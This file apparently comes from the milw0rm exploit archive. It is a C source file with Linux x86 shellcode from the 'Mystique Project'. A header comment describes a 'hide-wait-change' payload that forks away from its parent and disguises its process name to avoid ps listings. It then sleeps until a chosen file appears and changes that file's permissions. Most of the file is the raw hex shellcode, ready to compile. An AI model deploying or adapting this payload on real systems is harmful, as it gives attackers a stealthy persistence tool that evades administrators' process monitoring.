/*----------------------------------------------------------------------------*
 *          [Mystique Project: Examples of long-term payloads]                *
 *                       hide-wait-change code                                *
 *                 by xort@tty64.org  &  izik@tty64.org                       *
 *----------------------------------------------------------------------------*
 * This code, upon execution, will perform the following things...            *
 *                                                                            *
 *   1) Fork a new process, and kill PPID via _exit() so we get inherrited    *
 *      by init and now have a new PID.                                       *
 *   2) Will obtain the current location of argv[0] by retrieving information *
 *      from /proc/self/stat.                                                 *
 *   3) Copy the name we wish to masquarade as into argv[0] in memory.        *
 *   4) Call setsid() to establish ourselfs as a process leader.              *
 *   5) Will sleep via nanosleep() for a givin interval of time.              *
 *   6) Will check to see if a file exist via access().                       *
 *   7) If it does not Loop back to step 5                                    *
 *   8) If it does then we chmod() the file with permissions 0455.            *
 *   9) Calls _exit()                                                         *
 *                                                                            *
 *  * steps 3-4 effectivly hide us from most ps-listings                      *
 *                                                                            *
 *   size: 187 + strlen(new-proc-name) + strlen(file-to-change)               *
 *----------------------------------------------------------------------------*/

char shellcode[]=
"\x6a\x02\x58\xcd\x80\x85\xc0\x74\x79\x31\xc0\x40\xcd\x80\x5b\x8d"
"\x73\x10\xfe\x43\x0f\x99\x31\xc9\xb0\x05\xcd\x80\x93\x6a\x03\x58"
"\xb2\xfa\x89\xe1\x29\xd1\xcd\x80\x89\xcf\x01\xc7\x93\xfd\x6a\x20"
"\x58\x6a\x0e\x59\x87\xcb\xf2\xae\x87\xcb\xe2\xf8\x47\x47\x31\xc0"
"\x6a\x0a\x5b\xfc\x31\xd2\x8a\x0f\x83\xe9\x30\x01\xc8\x47\x80\x3f"
"\x20\x74\x04\xf7\xe3\xeb\xed\x94\x5f\x5f\x94\x57\xb1\xff\x31\xc0"
"\xf3\xaa\x5f\x56\x4e\x46\x41\x80\x3e\xff\x75\xf9\xfe\x06\x5e\xf3"
"\xa4\xb0\x42\xcd\x80\x89\xf7\x92\x48\x89\xc1\xf2\xae\xfe\x47\xff"
"\xff\xe7\xe8\x87\xff\xff\xff"
"/proc/self/stat\xff"                       //
"xort and izik rocks the linux box\xff"     // new proc name
"/tmp/foo\xff"                              // file to chmod
"\x6a"                                      //
"\x03"                                      // sleep-time
"\x40\x89\xe1\x89\xe3\x34\xa2\xcd\x80\x31\xc9\x89\xf3\x34\x21\xcd"
"\x80\x85\xc0\x75\xeb\xb0\x0f\x66\xb9\x6d\x09\xcd\x80\x40\xcd\x80";

// milw0rm.com [2005-09-08]